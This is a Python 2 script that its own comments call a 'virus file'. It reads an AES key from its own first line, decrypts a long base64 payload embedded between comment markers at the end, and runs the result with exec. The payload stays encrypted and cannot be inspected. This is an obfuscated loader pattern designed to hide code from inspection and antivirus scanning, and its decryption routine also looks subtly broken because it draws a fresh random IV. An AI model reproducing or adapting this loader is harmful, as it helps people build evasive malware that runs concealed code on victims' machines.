print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload